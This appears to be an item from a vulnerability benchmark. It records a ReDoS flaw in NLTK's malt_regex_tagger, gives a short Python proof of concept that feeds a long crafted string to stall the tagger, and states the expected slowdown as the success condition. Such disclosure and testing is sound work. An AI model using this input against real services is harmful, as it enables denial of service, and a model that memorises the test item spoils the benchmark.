title: Incorrectly specified regex in RegexpTagger leads to ReDoS vulnerability
trigger_payload:
from nltk.parse.malt import malt_regex_tagger
	tagger = malt_regex_tagger()
	length = 50000
	t = time.time()
	tagger(["-" + "0" * length + "q"])
	print(f"Tagging took {time.time() - t:.8}s for length 50000.")
oracle: The tagging operation takes significantly longer (e.g., 26 seconds) compared to the fixed version (e.g., 0.002 seconds), indicating a ReDoS condition.
